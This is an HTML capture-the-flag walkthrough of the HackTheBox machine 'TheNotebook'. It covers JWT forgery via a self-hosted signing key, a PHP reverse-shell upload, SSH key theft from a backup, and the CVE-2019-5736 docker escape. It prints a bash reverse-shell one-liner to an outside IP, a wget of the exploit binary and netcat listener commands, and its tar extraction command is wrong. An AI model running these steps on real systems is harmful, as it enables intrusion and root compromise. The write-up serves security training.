@@ -1,0 +1,116 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">TheNotebook HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/thenotebook-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-10-16T10:38:51+00:00">October 16, 2021</time><time class="updated" datetime="2025-06-20T16:57:19+00:00">June 20, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">We’ll look at another one of HackTheBox machines today, called “TheNotebook.” It is a medium difficulty box targeting the commonly found threat of using insecure JWT token implementation. A user is able to gain access to the system by forging this token and adding desired values. We’d own the root user by targeting it. Here is the methodology.</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<p><span style="color: #000000;"><strong>Recon</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+<li><span style="color: #000000;">JWT cookie analysis</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Forging the JWT token with admin rights and self-generated private key</span></li>
+<li><span style="color: #000000;">Uploading a PHP backdoor</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Recovering SSH private key from an old backup directory</span></li>
+<li><span style="color: #000000;">Enumerating sudoers</span></li>
+<li><span style="color: #000000;">Exploiting vulnerable version of docker (<strong>CVE-2019-5736</strong>)</span></li>
+<li><span style="color: #000000;">Gaining root access</span></li>
+</ul>
+<h3><span style="color: #800000;">Recon</span></h3>
+<p><span style="color: #000000;">Machine’s IP was 10.129.211.197. The first step was to run nmap’s aggressive scan to look for open ports. As you can see a port 80 was found to be open.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A  10.129.211.197</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhxStGsjlqoMdg-fqQAmSSYabLKUUB9WK0xjmsnCcz4Olhw2YiFzSgatbKkR5xOP_nrszkGgwv8HwCkODldvhGafKXbu1VuEQH5r2jD9dmeM_3tdWq8mx6AkfTD4AyBjOK29y1jsozULsC75S92ZNEvnXnKX1hOBIkHxzFyWfWNA9QYQyAbHvOjkMrxoQ=s16000"/></span></p>
+<p><span style="color: #000000;">The website opens up a note management tool. There was a register link too.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh9II0XWiAF2nB9FN6YK_KuzG8cloMPpkRy1UgKBHjxGocYSu8TN-rmBExFlYxspAWynwElrM1prwz4aus4Yo8OpwHZ8Y2NzbhUs5KCSqypVvFiJHYBfyJ4vtbykdz_8f9fxOBnp0PnnZk_j4O7jSPzUCWbTVLbUofCpVZHgEDkxmiAShDqsNJ6-jKiBQ=s16000"/></span></p>
+<p><span style="color: #000000;">After registering, we observed that a Base64 encoded token was being transferred on our request of signing up. It would be interesting to see what data was getting transferred.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg3DRjo7QpBZmTa_ipXzYoTpGJrF7S20TbNTfQJPnhAaEWYAynZzpDx6hZvGoDj7kbQYNMrpHJyvcrRlAYa_zZh4v8S1EwWXWm5ewt-Mp4GGHQCgbiyndujlPOhSx1dymqQ6cdNzH10YltwwkOAjF89wP8jydsRCbM_XeOdy2HEB_Z5zL8ywMjVZ2LF3g=s16000"/></span></p>
+<p><span style="color: #000000;">We decoded the Base64 and got to know it was a JWT token.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjauKy8x3om8f_ZnZKWKGqYzhrM3b2baWZHfxxOTpNNzTGKllN3SmFasz6osZQcJLbewxjk1-CpdPJS-IRaftKwJnJgShFrRwijbmsgos-iua8eS77Csy2qdoMJbCuMw0trR3vZnNXEMnvXooNhreqFFtQxiDzjEj6TzMKlrCcHdKHmoMD355VbIc8gzA=s16000"/></span></p>
+<p><span style="color: #000000;">We have often extracted critical information out of JWT token misconfigurations. So, we used jwt.io for the purpose. As you can see that the header picks a “Key ID” or “kid” from a remote location. This is a private key that is used as an authentication method by clients to authenticate to the authorization server when using the token endpoint. Also, there is an “admin_cap” variable that shows if admin access is provided to the user or not.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiDOLFVJ9vaIuA97RhE65fhb-uN9d76pLsHySLZ2qlCxkbCAImX6tjzR9R57Cot--BIoKEHlkwPhgXRvqBiNtm4SlaiA1O1GzK-od50QSbibnVAtDalg5YX3ClykB3F0MYpOWEIJVh5uNgV8SVoO6MgedtcqtualoyU4dkL1Zyk2tm751eBFKS-K9mnZA=s16000"/></span></p>
+<p> </p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">So, we’ll generate a private key, host it on our local server, and change the JWT header to my own key’s location and try if the website fetches and authenticates using our key.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl genrsa -out privKey.key 2048
+python -m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiKERiNvpDJYi_lkt_ByiJjfSgLcDTk4f31yDqOV-xI5NycZ2Y5VPDStdO1s7owotkJQl8bczUrzbFbiETOBafn9hY-M7xqrs0B-pANDBQr3l3i3zm2FW0oS01eRW0HGJYuyRMR-Dq9ujfMwtluCI23UdUzADJrHxjhjT3vqy5VyKJMyg37fPBgfsvvFw=s16000"/></span></p>
+<p><span style="color: #000000;">We’d change the fields in our JWT header now and paste our own key in the field below for the token to verify the signature and successfully authenticate using my key.</span></p>
+<p><span style="color: #000000;">Then, after we log in using the username and password we used to sign up, we should replace this newly generated token in the auth cookie and reload the site. After doing this, we see the admin panel now visible on the nav bar.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjofcwslLCm9ZlGOfJkAR1Z7ikUqf1Hh8Z4PiKPLbcVUZmgdKMpjEc8u9KSnJto3Yt5Rb62UC83tYLUO-x2ASlRXn4l9vpGTWd8G-5E1hdRqikltWMta0YeWL4gzN4Utm7uGJxT9v7bE3d-3pIcD_ovYmuNiiuINcYZkpiP4AOqpyVoAFS2oGYXkM3j9g=s16000"/></span></p>
+<p><span style="color: #000000;">Then, after we log in using the username and password we used to sign up, we should replace this newly generated token in the auth cookie and reload the site. After doing this, we see the admin panel now visible on the nav bar.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiMqsByEE-27_GBugCf4fsmlYd_9MqEcqdESbF6UyuvXIpJef15jxTdTbD3FkQrXP5jkp0nrMpItFDb6NjrQPMAAaZ2kdbne71t2cMJaC7I8qzvyaJXOfc1MlQzag3FoDBMAtrngDJwvu-XKJJBt3yNcrC8U5ocNAv1kKnYoX1Q9obVSinAx8tnIBHJNg=s16000"/></span></p>
+<p><span style="color: #000000;">The admin panel has an upload file option.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjF9Vf49vugvtjDbwJrSGY_DYtUtgnK1-F2J89JXo4VKB6p4PHqHsZVldYn87PgE0TxXekqO4NBDw2Esl4D6xpL2F67m-0UHMuxr1TRlVfFJIi9RbXSvohCWTUeZkcT3ZcBcGxqD9qB33aVGJgr00WLwbuiRxJC4LrsQEBOIcFJSVrCEVmTl2sArSglJg=s16000"/></span></p>
+<p><span style="color: #000000;">So we uploaded a php-reverse-shell from the /usr/share/webshells/php directory in Kali and changed the location with our local IP.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiGkdoJcz9ciRTK19dbi7EGuU8dz_UA5fRjcGpadQJzucvjbWaQKkwHfHY68x7XqxPl0D2JAn6aAIypF0lPWok54zNU6A4HS_WREf6iE8B1skQeAHDLFrDuYQZpOx-V4RZAIKpUw5E_CgrHgdWeBagZdxRVUALSz-aJsNug_cgj6-zgCUDoULjwiolWZQ=s16000"/></span></p>
+<p><span style="color: #000000;">To make things easy, site provided us with a link to view the uploaded file too.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgWuPBFgacRf2h4pB7Rxm1_12ExMZQQduYY-QdUXYmDfDrZOvCE1oPKu2QWssyn57oMK1xrybxIdX096zSpdG6APLfy-mAhiBC6pz_l7Sxdzz5By9Pa8hTPFLGcpY84Wn_LkCbamtKk1PmmWGk9Wj8-_0d-OZCX07gE3y2_nCPer-KKhlWCVnrV1rMEKg=s16000"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Before opening this file up, we fired a netcat listener. Then after clicking on view can get a reverse shell. We convert this into a proper teletype first.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">In the var/backups directory, we saw home.tar.gz which was an old account backup.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhOPFU80z7gBG-9h_uqzfdTZXVkBNZZngWMcmX54HSHqhHbfSijXWD0GRK9ZKRJ41BvusGsTnU2Zh-d4w475LhXsb1Auod0GFa6JmFyvrVuBSVcDMoa-NPFaBMYp1isv7Rx0ue3ZaCXNpM5yUtiS6ZbdzBKVJdRgpZKKrReTAdPKjM9BAyJ6jNvhQn4Hw=s16000"/></span></p>
+<p><span style="color: #000000;">We copy this into the temp directory and unzip it. We observed that the user is “<strong>noah</strong>” and has a dump of his home directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cp home.tar.gz /tmp/
+tar cvzf home.tar.gz</pre>
+<p><span style="color: #000000;">smart thing to do here is done dumpster diving for old SSH keys. Luckily, we did find the SSH keys and copied this private key to our system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /home/noah/.ssh/id_rsa</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjwvANJPXv5FTFtiBAId3w59eLHbuKT_wrARKzdUTKZ2CVLCy0dVv4LyQuhw5IHceMZKDCs4_lDQfZqlWSgodwswH4PLVusDnxLbXlahquCzL3nqS5kiMyVG_v45v8xuDqvJG9mfKPTueVbsDaxFQhB61ZRYGVqzaKz7jy2pRaT6uMfDpvUik2-YKcu5g=s16000"/></span></p>
+<p><span style="color: #000000;">We changed the permission on the key to “600” and logged in to noah’s account using it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano sshkey
+chmod 600 sshkey
+ssh -i sshkey noah@10.129.211.197</pre>
+<h5><span style="color: #000000;">The user flag was in /home.</span></h5>
+<p>Since the sudoers list is the most straightforward method of modeling the privilege escalation methodology, we examine it right away.</p>
+<p>We discovered that the “docker exec” command may be executed by Noah as root.</p>
+<p>Firstly, we listed Docker’s version.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l
+docker version</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjTJIozJU9Pj9tS2nTnTw2oI1D-d3_VRGOIIhgEDSPoVcjJsNKF4SuCEvPvI0VG60ZORFUVhJaerrhDTDVxezF08A9eFt_xv6MjwlU0aQb4fZ7f8ZqB-kZBwN3gqLUOGuyW7cdDVXBMEuLocISocyaNv_3Mz8ny3E2o1JtUtscj4z7tqcxwTfp7d2AEVg=s16000"/></span></p>
+<p><span style="color: #000000;">We observed that CVE-2019-5736, a docker escape vulnerability, affected version 18.06.0-ce. You can find the POC of the same <a style="color: #000000;" href="https://github.com/Frichetten/CVE-2019-5736-PoC">here</a>. This exploit would let us overwrite and execute the host systems binary from within the container.</span></p>
+<p><span style="color: #000000;">So, what we did was copy the exploit, modify it, upload it and execute it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/Frichetten/CVE-2019-5736-PoC
+cd CVE-2019-5736
+nano main.go</pre>
+<p><span style="color: #000000;">Here, we’ll modify the variable “payload” with this bash one-liner</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bash -i &gt;&amp; /dev/tcp/10.10.14.100/9999 0&gt;&amp;1</pre>
+<p><span style="color: #000000;">And then we save this</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgJ3GYLE4_NHyd8nhMkaz29QnFdk--AsfREHGeXhcvfWI-8e30zFHTzvAgKRXx82RNlP_1odK3Lgq0q7gqdhXJWofzQ7aynhcGzrbAm9wZBU3LRZnR-18xXJyCV1gW0-GRWPwP-_9hIsYcYArYUobYVUynnUFbE85hn3k71xmD1nChC7gVbg7S_hMX4Eg=s16000"/></span></p>
+<p><span style="color: #000000;">We need to compile this script into an executable and then launch our local server to upload it to the machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">go build main.go
+python -m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgW9TMQ9K5qnFrYZYaX6Lv99IdU-xEo8RkOZ2cI2v2bkM0TVlAdC19kVBoYLitevE-XVRbnhViBVsD6UsTg7MsiS2gqZ4ogqKYgkKbOy2CcKcEeFxBUckmXgSsaNOwc6MRtiY_6E70a_GfLzoZyZAD3HBlL8niHC7Y57l0UuM2CnV1SllU_T04v_Wdw6A=s16000"/></span></p>
+<p><span style="color: #000000;">In the machine, we first jumped into the container using docker exec command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash</pre>
+<p><span style="color: #000000;">After that, we’ll copy the exploit in /tmp and execute it</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+wget 10.10.14.100/main
+chmod 777 main
+./main</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgbyf6kwyXDoTPrIXPjCDVXFUS7wifXeYV4X-rSkj9JmNBYs48NhEXGordCYRrd6PiUpS1s7dpZ9DpCPXs-cpir7dJlHpGGywFj88p61VXPEx8c3T37lflA8F2f7lyp2PO3u6ux5BRr7PQweBJNsoPWmNh1SiXT5HwvZOhRnljUV49JQkhXYRhLYufxZQ=s16000"/></span></p>
+<p><span style="color: #000000;">Then, we’ll open another window, log in using noah separately, and execute the command docker exec command, but the catch is that this time our exploit overwrote the binary “sh,” and it will run the “payload” that we defined in our exploit.</span></p>
+<p><span style="color: #000000;">Also, make sure to fire up a netcat listener on port 9999.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /usr/bin/docker exec -it webapp-dev01 sh</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg_JDDDCX_Gv2oTh_Y0t4LeQyZ_7Dtz_qQHodVBXhoJvbU1Vk84EHDrguV-OkkNTeou34_Gf9n02210Bw1TpUAnmJC8SgxftSVfUxfuWChptGT7Yhe_AMBtTq8Q9iBitj906twF9SrMHDaJjLlqVW9J2O5hwimFL8dOqyOgyybVpD_SanGHwPzL3VdF6Q=s16000"/></strong></span></p>
+<p><span style="color: #000000;">We fired up the window in which netcat was running and observe a shell had been prompted. This is the root of thenotebook!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 9999
+cd /root
+cat root.txt</pre>
+<p><span style="color: #000000;">We snagged the flag in /root directory</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhg7wwKb84dZFRaEFscEBMBpiAgVlvSN0B-9mYIlcd-ORHxsEzCNCQ-j4fC_hr5WCZy_VR7g-gOpJQoZcqBSFVeB7PIgDPjDIb-ffAh_Yu5H4hN0isg2g7RbSVJ9puxR_j2dFE3UfpG0W5HG4a1btNADe_nVbBFooDef2zcZu-K9td3ZP7AEDACf1qerg=s16000"/></span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">Hence, this is how we were able to own the system access in the CTF TheNotebook. Please let us know in the comments how you found our approach and query any clarifications for any steps that you may need. Thanks for the read.</span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
